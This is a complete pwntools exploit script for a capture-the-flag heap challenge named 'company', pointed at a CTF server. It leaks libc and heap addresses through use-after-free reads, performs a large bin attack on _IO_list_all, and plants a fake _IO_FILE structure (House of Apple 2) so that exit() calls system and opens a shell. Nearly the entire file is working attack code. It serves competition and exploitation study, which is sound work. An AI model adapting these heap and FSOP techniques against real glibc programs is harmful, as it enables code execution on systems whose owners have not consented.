#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./company"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("company-v2.chal.crewc.tf", 17002)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def register_emp(index: int, size: int, name, position, salary: int):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b':', str(index))
    p.sendlineafter(b':', str(size))
    p.sendafter(b':', name)
    p.sendafter(b':', position)
    p.sendlineafter(b':', str(salary))

def fire_emp(index: int):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b':', str(index))

def feedback_emp(index_from: int, index_to: int, feedback):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'?', str(index_from))
    p.sendlineafter(b'?', str(index_to))
    p.sendafter(b':', feedback)

def view_proifile(index: int):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'?', str(index))
    p.recvuntil(b"Name: ")
    return p.recvline().rstrip()

def inc_salary(index: int, salary: int):
    p.sendlineafter(b'>', b'5')
    p.sendlineafter(b'?', str(index))
    p.sendlineafter(b':', str(salary))


"""
struct employee {
    char name[0x18],
    unsigned int salary,
    unsigned long size,
    char position[0x10],
    char feedback[size - 0x48]
};
"""

"""
House of Apple 2
// ref
https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2
// Summary
1. leak heap and libc address
2. create fake _IO_FILE struct on heap
3. overwrite stderr
4. call exit()
"""


# register name
name = b"kanimiso"
p.sendlineafter('?', name)

# heap feng shui
register_emp(0, 0x928, b'A' * 0x18, b'HR', 0x1234)
register_emp(1, 0x528, b'B' * 0x18, b"HR", 0x1234)

payload = b'C' * (0x4e0-8)
payload += b" sh;"
payload += b'\x00' * (8 - (len(payload) % 8))

feedback_emp(1, 1, payload)
fire_emp(1)

# employees[1].feedback is uninitialized
register_emp(2, 0x518, b'D' * 0x18, b"HR", 0x1234)

register_emp(3, 0x918, b'E' * 0x18, b'\0', 0x1234)
register_emp(4, 0x528, b'F' * 0x18, b"HR", 0x1234)
# employees[0] will send to unsorted bins
fire_emp(0)
# libc leak
leak = u64(view_proifile(0).ljust(8, b'\x00'))
log.info("leak: " + hex(leak))
libc_base = leak - 0x1f6ce0
libc.address = libc_base
log.info("libc base: " + hex(libc_base))
# heap leak
fire_emp(3)
leak = u64(view_proifile(3).ljust(8, b'\x00'))
log.info("leak: " + hex(leak))
heap_base = leak - 0x290
log.info("heap base: " + hex(heap_base))
# collect unsorted bin chunks
register_emp(5, 0x928, b'G' * 0x18, p64(901), 0x100)
register_emp(6, 0x918, b'H' * 0x18, b"HR", 0x100)

# prep for FSOP
_IO_list_all = libc.symbols["_IO_list_all"]
log.info("_IO_list_all: " + hex(_IO_list_all))
_IO_wfile_jumps = libc.symbols["_IO_wfile_jumps"]
log.info("_IO_wfile_jumps: " + hex(_IO_wfile_jumps))
_lock = libc.address + 0x1f8a20
log.info("_lock: " + hex(_lock))
fake_IO_FILE = heap_base + 0x10e0
log.info("fake _IO_FILE struct@heap: " + hex(fake_IO_FILE))
# fake _IO_FILE struct
# https://elixir.bootlin.com/glibc/glibc-2.37/source/libio/bits/types/struct_FILE.h#L49
payload = p64(0x0) * 6
payload += p64(0xffffffffffffffff)
payload += p64(0x0)
payload += p64(_lock)
payload += p64(0xffffffffffffffff)
payload += p64(0x0)
payload += p64(fake_IO_FILE + 0xe0)
payload += p64(0x0) * 6
payload += p64(_IO_wfile_jumps)
payload += b'Z' * 0x18
payload += p64(0x0)
payload += b'Z' * 0x10
payload += p64(0x0)
payload += b'Z' * 0xa8
payload += p64(fake_IO_FILE+0x200)
payload += b'Z' * 0xa0
payload += p64(libc.symbols['system'])
payload = payload.ljust(0x800, b'Z')

feedback_emp(6, 6, payload)

"""
======== current heap status ========
gef> heap chunks
Chunk(addr=0x55dd35d21000, size=0x290, flags=PREV_INUSE, fd=0x000000000000, bk=0x000000000000)
// 5
Chunk(addr=0x55dd35d21290, size=0x930, flags=PREV_INUSE, fd=0x4747474747474747, bk=0x4747474747474747, fd_nextsize=0x4747474747474747, bk_nextsize=0x00000000abcd)
// 2
Chunk(addr=0x55dd35d21bc0, size=0x530, flags=PREV_INUSE, fd=0x4444444444444444, bk=0x4444444444444444, fd_nextsize=0x4444444444444444, bk_nextsize=0x000000001234)
// 6
Chunk(addr=0x55dd35d220f0, size=0x920, flags=PREV_INUSE, fd=0x4848484848484848, bk=0x4848484848484848, fd_nextsize=0x4848484848484848, bk_nextsize=0x000000001234)
// 4
Chunk(addr=0x55dd35d22a10, size=0x530, flags=PREV_INUSE, fd=0x4646464646464646, bk=0x4646464646464646, fd_nextsize=0x4646464646464646, bk_nextsize=0x000000001234)
// top
Chunk(addr=0x55dd35d22f40, size=0x1f0c0, flags=PREV_INUSE, fd=0x000000000000, bk=0x000000000000, fd_nextsize=0x000000000000, bk_nextsize=0x000000000000)  <-  top
"""

# will send to unsorted bins
fire_emp(5)
# employees[5] will send to large bins
register_emp(7, 0x938, b'I' * 0x18, b"HR", 0x1234)
fire_emp(6)
# large bin attack
inc_salary(5, _IO_list_all - 0x20)
register_emp(8, 0x938, b'J' * 0x18, b"HR", 0x1234)
# call exit()
p.sendlineafter(b'>', b'-1')

p.interactive()
